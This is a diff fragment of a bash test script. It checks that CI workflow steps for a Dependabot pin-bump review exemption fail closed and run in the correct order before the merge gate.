+  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" pair-read-fails "$LANE_EVIDENCE"; rc_read=$?
+  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-malformed.json" ok "$LANE_EVIDENCE"; rc_malformed=$?
+  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" ok '{"exempt":false}'; rc_evidence=$?
+  set -e
+  if [ "$rc_read" -ne 0 ] && [ "$rc_malformed" -ne 0 ] && [ "$rc_evidence" -ne 0 ] && [ ! -f "$LANE_DIR/comment-writes" ]; then
+    pass "diagnostic step fails closed on an unreadable pair, a malformed pair, or non-exempt evidence, without writing"
+  else
+    fail "diagnostic step did not fail closed (read=$rc_read malformed=$rc_malformed evidence=$rc_evidence)"
+  fi
+
+  # auto-clear: both clearing loops consult the lane before the merge gate.
+  for job in evaluate-and-clear scheduled-sweep; do
+    LOOP=$(yq -r ".jobs.\"$job\".steps[] | select(.run != null) | select(.run | test(\"codex-review-check.sh \\\"\\\\\$PR\\\"\")) | .run" "$AUTO_CLEAR_WORKFLOW")
+    if [ -z "$LOOP" ]; then
+      fail "auto-clear $job: could not locate the clearing loop step"
+      continue
+    fi
+    helper_line=$(grep -n 'bash scripts/workflow/dependabot_pin_bump_exemption.sh' <<<"$LOOP" | head -1 | cut -d: -f1)
+    gate_line=$(grep -n 'scripts/codex-review-check.sh "$PR"' <<<"$LOOP" | head -1 | cut -d: -f1)
+    delete_line=$(grep -n -- '-X DELETE -i --silent' <<<"$LOOP" | head -1 | cut -d: -f1)
+    if [ -n "$helper_line" ] && [ -n "$gate_line" ] && [ -n "$delete_line" ] \
+       && [ "$helper_line" -lt "$gate_line" ] && [ "$gate_line" -lt "$delete_line" ] \
+       && grep -Fq 'PIN_JSON=$(GH_TOKEN="$WORKFLOW_TOKEN" bash scripts/workflow/dependabot_pin_bump_exemption.sh' <<<"$LOOP" \
+       && grep -Fq -- '--config .github/review-policy.yml' <<<"$LOOP" \
+       && grep -Fq 'gate_source=dependabot-pin-bump' <<<"$LOOP" \
+       && grep -Fq 'mergepath-dependabot-pin-bump:v1 verified-head=' <<<"$LOOP"; then
+      pass "auto-clear $job: runs the trusted pin-bump helper under the workflow token before the merge gate, and attributes the removal to the lane"
+    else
+      fail "auto-clear $job: the pin-bump lane must run before codex-review-check.sh and before the DELETE, under WORKFLOW_TOKEN with the default-branch policy (helper=$helper_line gate=$gate_line delete=$delete_line)"
+    fi
+    # rc 3 → infra sentinel; rc 1 → ordinary merge-gate evaluation.
+    arm=$(awk '/case "\$pin_rc" in/{f=1} f{print} f && /^[[:space:]]*esac[[:space:]]*$/{exit}' <<<"$LOOP")
+    if grep -Fq 'rc=3' <<<"$arm" && grep -Fq 'rc=0' <<<"$arm" \
+       && awk '/^[[:space:]]*1\)/{f=1} f && /codex-review-check.sh "\$PR"/{found=1} f && /;;/{exit} END{exit found?0:1}' <<<"$arm"; then
+      pass "auto-clear $job: an unreachable lane verdict is an infrastructure error and a not-applicable verdict falls through to the merge gate"
+    else
+      fail "auto-clear $job: pin_rc mapping is wrong: $arm"
+    fi
+  done
+else
+  echo "SKIP: workflow wiring assertions (yq or a workflow is unavailable)"
+fi
+
 echo "test_dependabot_auto_merge_check_wait: $PASS passed, $FAIL failed"
 [ "$FAIL" -eq 0 ]
